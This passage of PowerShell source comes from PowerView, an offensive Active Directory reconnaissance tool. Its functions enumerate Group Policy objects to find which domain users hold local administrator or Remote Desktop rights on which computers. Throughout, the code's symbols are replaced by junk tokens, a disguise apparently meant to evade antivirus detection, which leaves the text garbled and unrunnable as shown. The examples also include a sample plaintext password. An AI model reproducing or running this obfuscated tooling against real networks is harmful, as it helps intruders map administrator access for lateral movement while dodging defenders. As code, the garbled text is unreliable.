                    RaUSearcherArguments[q4gULDAPFilterq4gU] = Oj8X(objectCategory=groupPolicyContainer)Oj8X
                    Get-DomainObject @SearcherArguments wZ5t ForEach-Object {
                        if (RaUPSBoundParameters[q4gURawq4gU]) {
                            RaU_.PSObject.TypeNames.Insert(0, q4gUPowerView.GPO.Rawq4gU)
                        }
                        else {
                            RaU_.PSObject.TypeNames.Insert(0, q4gUPowerView.GPOq4gU)
                        }
                        RaU_
                    }
                }
            }
            else {
                RaUIdentityFilter = q4gUq4gU
                RaUFilter = q4gUq4gU
                RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                    RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                    if (RaUIdentityInstance -match q4gULDAP://wZ5t^CN=.*q4gU) {
                        RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                        if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                            # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                            Write-Verbose Oj8X[Get-DomainGPO] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                            RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                            RaUGPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not RaUGPOSearcher) {
                                Write-Warning Oj8X[Get-DomainGPO] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                            }
                        }
                    }
                    elseif (RaUIdentityInstance -match q4gU{.*}q4gU) {
                        RaUIdentityFilter += Oj8X(name=RaUIdentityInstance)Oj8X
                    }
                    else {
                        try {
                            RaUGuidByteString = (-Join (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object {RaU_.ToString(q4gUXq4gU).PadLeft(2,q4gU0q4gU)})) -Replace q4gU(..)q4gU,q4gUScKjRaU1q4gU
                            RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                        }
                        catch {
                            RaUIdentityFilter += Oj8X(displayname=RaUIdentityInstance)Oj8X
                        }
                    }
                }
                if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                    RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
                }

                if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                    Write-Verbose Oj8X[Get-DomainGPO] Using additional LDAP filter: RaULDAPFilterOj8X
                    RaUFilter += Oj8XRaULDAPFilterOj8X
                }

                RaUGPOSearcher.filter = Oj8X(&(objectCategory=groupPolicyContainer)RaUFilter)Oj8X
                Write-Verbose Oj8X[Get-DomainGPO] filter string: RaU(RaUGPOSearcher.filter)Oj8X

                if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUGPOSearcher.FindOne() }
                else { RaUResults = RaUGPOSearcher.FindAll() }
                RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                    if (RaUPSBoundParameters[q4gURawq4gU]) {
                        # return raw result objects
                        RaUGPO = RaU_
                        RaUGPO.PSObject.TypeNames.Insert(0, q4gUPowerView.GPO.Rawq4gU)
                    }
                    else {
                        if (RaUPSBoundParameters[q4gUSearchBaseq4gU] -and (RaUSearchBase -Match q4gU^GC://q4gU)) {
                            RaUGPO = Convert-LDAPProperty -Properties RaU_.Properties
                            try {
                                RaUGPODN = RaUGPO.distinguishedname
                                RaUGPODomain = RaUGPODN.SubString(RaUGPODN.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                                RaUgpcfilesyspath = Oj8XScKjScKjRaUGPODomainScKjSysVolScKjRaUGPODomainScKjPoliciesScKjRaU(RaUGPO.cn)Oj8X
                                RaUGPO wZ5t Add-Member Noteproperty q4gUgpcfilesyspathq4gU RaUgpcfilesyspath
                            }
                            catch {
                                Write-Verbose Oj8X[Get-DomainGPO] Error calculating gpcfilesyspath for: RaU(RaUGPO.distinguishedname)Oj8X
                            }
                        }
                        else {
                            RaUGPO = Convert-LDAPProperty -Properties RaU_.Properties
                        }
                        RaUGPO.PSObject.TypeNames.Insert(0, q4gUPowerView.GPOq4gU)
                    }
                    RaUGPO
                }
                if (RaUResults) {
                    try { RaUResults.dispose() }
                    catch {
                        Write-Verbose Oj8X[Get-DomainGPO] Error disposing of the Results object: RaU_Oj8X
                    }
                }
                RaUGPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {
<#
.SYNOPSIS

Returns all GPOs in a domain that modify local group memberships through q4gURestricted Groupsq4gU
or Group Policy preferences. Also return their user membership mappings, if they exist.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, Get-GroupsXML, ConvertTo-SID, ConvertFrom-SID  

.DESCRIPTION

First enumerates all GPOs in the current/target domain using Get-DomainGPO with passed
arguments, and for each GPO checks if q4gURestricted Groupsq4gU are set with GptTmpl.inf or
group membership is set through Group Policy Preferences groups.xml files. For any
GptTmpl.inf files found, the file is parsed with Get-GptTmpl and any q4gUGroup Membershipq4gU
section data is processed if present. Any found Groups.xml files are parsed with
Get-GroupsXML and those memberships are returned as well.

.PARAMETER Identity

A display name (e.g. q4gUTest GPOq4gU), DistinguishedName (e.g. q4gUCN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=localq4gU),
GUID (e.g. q4gU10ec320d-3111-4ef4-8faf-8f14f4adc789q4gU), or GPO name (e.g. q4gU{F260B76D-55C8-46C5-BEF1-9016DD98E272}q4gU). Wildcards accepted.

.PARAMETER ResolveMembersToSIDs

Switch. Indicates that any member names should be resolved to their domain SIDs.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOLocalGroup

Returns all local groups set by GPO along with their members and memberof.

.EXAMPLE

Get-DomainGPOLocalGroup -ResolveMembersToSIDs

Returns all local groups set by GPO along with their members and memberof,
and resolve any members to their domain SIDs.

.EXAMPLE

q4gU{0847C615-6C4E-4D45-A064-6001040CC21C}q4gU wZ5t Get-DomainGPOLocalGroup

Return any GPO-set groups for the GPO with the given name/GUID.

.EXAMPLE

Get-DomainGPOLocalGroup q4gUDesktopsq4gU

Return any GPO-set groups for the GPO with the given display name.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainGPOLocalGroup -Credential RaUCred

.LINK

https://morgansimonsenblog.azurewebsites.net/tag/groups/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.GPOGroupq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String[]]
        RaUIdentity,

        [Switch]
        RaUResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUSearcherArguments[q4gULDAPFilterq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUConvertArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUConvertArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUConvertArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUConvertArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUSplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if (RaUPSBoundParameters[q4gUIdentityq4gU]) { RaUSearcherArguments[q4gUIdentityq4gU] = RaUIdentity }

        Get-DomainGPO @SearcherArguments wZ5t ForEach-Object {
            RaUGPOdisplayName = RaU_.displayname
            RaUGPOname = RaU_.name
            RaUGPOPath = RaU_.gpcfilesyspath

            RaUParseArgs =  @{ q4gUGptTmplPathq4gU = Oj8XRaUGPOPathScKjMACHINEScKjMicrosoftScKjWindows NTScKjSecEditScKjGptTmpl.infOj8X }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUParseArgs[q4gUCredentialq4gU] = RaUCredential }

            # first parse the q4gURestricted Groupsq4gU file (GptTmpl.inf) if it exists
            RaUInf = Get-GptTmpl @ParseArgs

            if (RaUInf -and (RaUInf.psbase.Keys -contains q4gUGroup Membershipq4gU)) {
                RaUMemberships = @{}

                # parse the members/memberof fields for each entry
                ForEach (RaUMembership in RaUInf.q4gUGroup Membershipq4gU.GetEnumerator()) {
                    RaUGroup, RaURelation = RaUMembership.Key.Split(q4gU__q4gU, RaUSplitOption) wZ5t ForEach-Object {RaU_.Trim()}
                    # extract out ALL members
                    RaUMembershipValue = RaUMembership.Value wZ5t Where-Object {RaU_} wZ5t ForEach-Object { RaU_.Trim(q4gU*q4gU) } wZ5t Where-Object {RaU_}

                    if (RaUPSBoundParameters[q4gUResolveMembersToSIDsq4gU]) {
                        # if the resulting member is username and not a SID, attempt to resolve it
                        RaUGroupMembers = @()
                        ForEach (RaUMember in RaUMembershipValue) {
                            if (RaUMember -and (RaUMember.Trim() -ne q4gUq4gU)) {
                                if (RaUMember -notmatch q4gU^S-1-.*q4gU) {
                                    RaUConvertToArguments = @{q4gUObjectNameq4gU = RaUMember}
                                    if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUConvertToArguments[q4gUDomainq4gU] = RaUDomain }
                                    RaUMemberSID = ConvertTo-SID @ConvertToArguments

                                    if (RaUMemberSID) {
                                        RaUGroupMembers += RaUMemberSID
                                    }
                                    else {
                                        RaUGroupMembers += RaUMember
                                    }
                                }
                                else {
                                    RaUGroupMembers += RaUMember
                                }
                            }
                        }
                        RaUMembershipValue = RaUGroupMembers
                    }

                    if (-not RaUMemberships[RaUGroup]) {
                        RaUMemberships[RaUGroup] = @{}
                    }
                    if (RaUMembershipValue -isnot [System.Array]) {RaUMembershipValue = @(RaUMembershipValue)}
                    RaUMemberships[RaUGroup].Add(RaURelation, RaUMembershipValue)
                }

                ForEach (RaUMembership in RaUMemberships.GetEnumerator()) {
                    if (RaUMembership -and RaUMembership.Key -and (RaUMembership.Key -match q4gU^ScKj*q4gU)) {
                        # if the SID is already resolved (i.e. begins with *) try to resolve SID to a name
                        RaUGroupSID = RaUMembership.Key.Trim(q4gU*q4gU)
                        if (RaUGroupSID -and (RaUGroupSID.Trim() -ne q4gUq4gU)) {
                            RaUGroupName = ConvertFrom-SID -ObjectSID RaUGroupSID @ConvertArguments
                        }
                        else {
                            RaUGroupName = RaUFalse
                        }
                    }
                    else {
                        RaUGroupName = RaUMembership.Key

                        if (RaUGroupName -and (RaUGroupName.Trim() -ne q4gUq4gU)) {
                            if (RaUGroupname -match q4gUAdministratorsq4gU) {
                                RaUGroupSID = q4gUS-1-5-32-544q4gU
                            }
                            elseif (RaUGroupname -match q4gURemote Desktopq4gU) {
                                RaUGroupSID = q4gUS-1-5-32-555q4gU
                            }
                            elseif (RaUGroupname -match q4gUGuestsq4gU) {
                                RaUGroupSID = q4gUS-1-5-32-546q4gU
                            }
                            elseif (RaUGroupName.Trim() -ne q4gUq4gU) {
                                RaUConvertToArguments = @{q4gUObjectNameq4gU = RaUGroupname}
                                if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUConvertToArguments[q4gUDomainq4gU] = RaUDomain }
                                RaUGroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                RaUGroupSID = RaUNull
                            }
                        }
                    }

                    RaUGPOGroup = New-Object PSObject
                    RaUGPOGroup wZ5t Add-Member Noteproperty q4gUGPODisplayNameq4gU RaUGPODisplayName
                    RaUGPOGroup wZ5t Add-Member Noteproperty q4gUGPONameq4gU RaUGPOName
                    RaUGPOGroup wZ5t Add-Member Noteproperty q4gUGPOPathq4gU RaUGPOPath
                    RaUGPOGroup wZ5t Add-Member Noteproperty q4gUGPOTypeq4gU q4gURestrictedGroupsq4gU
                    RaUGPOGroup wZ5t Add-Member Noteproperty q4gUFiltersq4gU RaUNull
                    RaUGPOGroup wZ5t Add-Member Noteproperty q4gUGroupNameq4gU RaUGroupName
                    RaUGPOGroup wZ5t Add-Member Noteproperty q4gUGroupSIDq4gU RaUGroupSID
                    RaUGPOGroup wZ5t Add-Member Noteproperty q4gUGroupMemberOfq4gU RaUMembership.Value.Memberof
                    RaUGPOGroup wZ5t Add-Member Noteproperty q4gUGroupMembersq4gU RaUMembership.Value.Members
                    RaUGPOGroup.PSObject.TypeNames.Insert(0, q4gUPowerView.GPOGroupq4gU)
                    RaUGPOGroup
                }
            }

            # now try to the parse group policy preferences file (Groups.xml) if it exists
            RaUParseArgs =  @{
                q4gUGroupsXMLpathq4gU = Oj8XRaUGPOPathScKjMACHINEScKjPreferencesScKjGroupsScKjGroups.xmlOj8X
            }

            Get-GroupsXML @ParseArgs wZ5t ForEach-Object {
                if (RaUPSBoundParameters[q4gUResolveMembersToSIDsq4gU]) {
                    RaUGroupMembers = @()
                    ForEach (RaUMember in RaU_.GroupMembers) {
                        if (RaUMember -and (RaUMember.Trim() -ne q4gUq4gU)) {
                            if (RaUMember -notmatch q4gU^S-1-.*q4gU) {

                                # if the resulting member is username and not a SID, attempt to resolve it
                                RaUConvertToArguments = @{q4gUObjectNameq4gU = RaUGroupname}
                                if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUConvertToArguments[q4gUDomainq4gU] = RaUDomain }
                                RaUMemberSID = ConvertTo-SID -Domain RaUDomain -ObjectName RaUMember

                                if (RaUMemberSID) {
                                    RaUGroupMembers += RaUMemberSID
                                }
                                else {
                                    RaUGroupMembers += RaUMember
                                }
                            }
                            else {
                                RaUGroupMembers += RaUMember
                            }
                        }
                    }
                    RaU_.GroupMembers = RaUGroupMembers
                }

                RaU_ wZ5t Add-Member Noteproperty q4gUGPODisplayNameq4gU RaUGPODisplayName
                RaU_ wZ5t Add-Member Noteproperty q4gUGPONameq4gU RaUGPOName
                RaU_ wZ5t Add-Member Noteproperty q4gUGPOTypeq4gU q4gUGroupPolicyPreferencesq4gU
                RaU_.PSObject.TypeNames.Insert(0, q4gUPowerView.GPOGroupq4gU)
                RaU_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {
<#
.SYNOPSIS

Enumerates the machines where a specific domain user/group is a member of a specific
local group, all through GPO correlation. If no user/group is specified, all
discoverable mappings are returned.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPOLocalGroup, Get-DomainObject, Get-DomainComputer, Get-DomainOU, Get-DomainSite, Get-DomainGroup  

.DESCRIPTION

Takes a user/group name and optional domain, and determines the computers in the domain
the user/group has local admin (or RDP) rights to.

It does this by:
    1.  resolving the user/group to its proper SID
    2.  enumerating all groups the user/group is a current part of
        and extracting all target SIDs to build a target SID list
    3.  pulling all GPOs that set q4gURestricted Groupsq4gU or Groups.xml by calling
        Get-DomainGPOLocalGroup
    4.  matching the target SID list to the queried GPO SID list
        to enumerate all GPO the user is effectively applied with
    5.  enumerating all OUs and sites and applicable GPO GUIs are
        applied to through gplink enumerating
    6.  querying for all computers under the given OUs or sites

If no user/group is specified, all user/group -> machine mappings discovered through
GPO relationships are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the user/group to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be Oj8XAdministratorsOj8X (S-1-5-32-544), Oj8XRDP/Remote Desktop UsersOj8X (S-1-5-32-555),
or a custom local SID. Defaults to local q4gUAdministratorsq4gU.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping

Find all user/group -> machine relationships where the user/group is a member
of the local administrators group on target machines.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping -Identity dfm -Domain dev.testlab.local

Find all computers that dfm user has local administrator rights to in
the dev.testlab.local domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainGPOUserLocalGroupMapping -Credential RaUCred

.OUTPUTS

PowerView.GPOLocalGroupMapping

A custom PSObject containing any target identity information and what local
group memberships theyq4gUre a part of through GPO correlation.

.LINK

http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.GPOUserLocalGroupMappingq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU)]
        [String]
        RaUIdentity,

        [String]
        [ValidateSet(q4gUAdministratorsq4gU, q4gUS-1-5-32-544q4gU, q4gURDPq4gU, q4gURemote Desktop Usersq4gU, q4gUS-1-5-32-555q4gU)]
        RaULocalGroup = q4gUAdministratorsq4gU,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUCommonArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUCommonArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUCommonArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUCommonArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUCommonArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUCommonArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUCommonArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUCommonArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        RaUTargetSIDs = @()

        if (RaUPSBoundParameters[q4gUIdentityq4gU]) {
            RaUTargetSIDs += Get-DomainObject @CommonArguments -Identity RaUIdentity wZ5t Select-Object -Expand objectsid
            RaUTargetObjectSID = RaUTargetSIDs
            if (-not RaUTargetSIDs) {
                Throw Oj8X[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity q4gURaUIdentityq4gUOj8X
            }
        }
        else {
            # no filtering/match all
            RaUTargetSIDs = @(q4gU*q4gU)
        }

        if (RaULocalGroup -match q4gUS-1-5q4gU) {
            RaUTargetLocalSID = RaULocalGroup
        }
        elseif (RaULocalGroup -match q4gUAdminq4gU) {
            RaUTargetLocalSID = q4gUS-1-5-32-544q4gU
        }
        else {
            # RDP
            RaUTargetLocalSID = q4gUS-1-5-32-555q4gU
        }

        if (RaUTargetSIDs[0] -ne q4gU*q4gU) {
            ForEach (RaUTargetSid in RaUTargetSids) {
                Write-Verbose Oj8X[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: q4gURaUTargetSidq4gUOj8X
                RaUTargetSIDs += Get-DomainGroup @CommonArguments -Properties q4gUobjectsidq4gU -MemberIdentity RaUTargetSid wZ5t Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose Oj8X[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: RaUTargetLocalSIDOj8X
        Write-Verbose Oj8X[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: RaUTargetSIDsOj8X

        RaUGPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs wZ5t ForEach-Object {
            RaUGPOgroup = RaU_
            # if the locally set group is what weq4gUre looking for, check the GroupMembers (q4gUmembersq4gU) for our target SID
            if (RaUGPOgroup.GroupSID -match RaUTargetLocalSID) {
                RaUGPOgroup.GroupMembers wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                    if ( (RaUTargetSIDs[0] -eq q4gU*q4gU) -or (RaUTargetSIDs -Contains RaU_) ) {
                        RaUGPOgroup
                    }
                }
            }
            # if the group is a q4gUmemberofq4gU the group weq4gUre looking for, check GroupSID against the targt SIDs
            if ( (RaUGPOgroup.GroupMemberOf -contains RaUTargetLocalSID) ) {
                if ( (RaUTargetSIDs[0] -eq q4gU*q4gU) -or (RaUTargetSIDs -Contains RaUGPOgroup.GroupSID) ) {
                    RaUGPOgroup
                }
            }
        } wZ5t Sort-Object -Property GPOName -Unique

        RaUGPOgroups wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
            RaUGPOname = RaU_.GPODisplayName
            RaUGPOguid = RaU_.GPOName
            RaUGPOPath = RaU_.GPOPath
            RaUGPOType = RaU_.GPOType
            if (RaU_.GroupMembers) {
                RaUGPOMembers = RaU_.GroupMembers
            }
            else {
                RaUGPOMembers = RaU_.GroupSID
            }

            RaUFilters = RaU_.Filters

            if (RaUTargetSIDs[0] -eq q4gU*q4gU) {
                # if the * wildcard was used, set the targets to all GPO members so everything it output
                RaUTargetObjectSIDs = RaUGPOMembers
            }
            else {
                RaUTargetObjectSIDs = RaUTargetObjectSID
            }

            # find any OUs that have this GPO linked through gpLink
            Get-DomainOU @CommonArguments -Raw -Properties q4gUname,distinguishednameq4gU -GPLink RaUGPOGuid wZ5t ForEach-Object {
                if (RaUFilters) {
                    RaUOUComputers = Get-DomainComputer @CommonArguments -Properties q4gUdnshostname,distinguishednameq4gU -SearchBase RaU_.Path wZ5t Where-Object {RaU_.distinguishedname -match (RaUFilters.Value)} wZ5t Select-Object -ExpandProperty dnshostname
                }
                else {
                    RaUOUComputers = Get-DomainComputer @CommonArguments -Properties q4gUdnshostnameq4gU -SearchBase RaU_.Path wZ5t Select-Object -ExpandProperty dnshostname
                }

                if (RaUOUComputers) {
                    if (RaUOUComputers -isnot [System.Array]) {RaUOUComputers = @(RaUOUComputers)}

                    ForEach (RaUTargetSid in RaUTargetObjectSIDs) {
                        RaUObject = Get-DomainObject @CommonArguments -Identity RaUTargetSid -Properties q4gUsamaccounttype,samaccountname,distinguishedname,objectsidq4gU

                        RaUIsGroup = @(q4gU268435456q4gU,q4gU268435457q4gU,q4gU536870912q4gU,q4gU536870913q4gU) -contains RaUObject.samaccounttype

                        RaUGPOLocalGroupMapping = New-Object PSObject
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUObjectNameq4gU RaUObject.samaccountname
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUObjectDNq4gU RaUObject.distinguishedname
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUObjectSIDq4gU RaUObject.objectsid
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUDomainq4gU RaUDomain
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUIsGroupq4gU RaUIsGroup
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUGPODisplayNameq4gU RaUGPOname
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUGPOGuidq4gU RaUGPOGuid
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUGPOPathq4gU RaUGPOPath
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUGPOTypeq4gU RaUGPOType
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUContainerNameq4gU RaU_.Properties.distinguishedname
                        RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUOUComputers
                        RaUGPOLocalGroupMapping.PSObject.TypeNames.Insert(0, q4gUPowerView.GPOLocalGroupMappingq4gU)
                        RaUGPOLocalGroupMapping
                    }
                }
            }

            # find any sites that have this GPO linked through gpLink
            Get-DomainSite @CommonArguments -Properties q4gUsiteobjectbl,distinguishednameq4gU -GPLink RaUGPOGuid wZ5t ForEach-Object {
                ForEach (RaUTargetSid in RaUTargetObjectSIDs) {
                    RaUObject = Get-DomainObject @CommonArguments -Identity RaUTargetSid -Properties q4gUsamaccounttype,samaccountname,distinguishedname,objectsidq4gU

                    RaUIsGroup = @(q4gU268435456q4gU,q4gU268435457q4gU,q4gU536870912q4gU,q4gU536870913q4gU) -contains RaUObject.samaccounttype

                    RaUGPOLocalGroupMapping = New-Object PSObject
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUObjectNameq4gU RaUObject.samaccountname
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUObjectDNq4gU RaUObject.distinguishedname
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUObjectSIDq4gU RaUObject.objectsid
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUIsGroupq4gU RaUIsGroup
                    RaUGPOLocalGroupMapping wZ5t Add-Member Noteproperty q4gUDomainq4gU RaUDomain
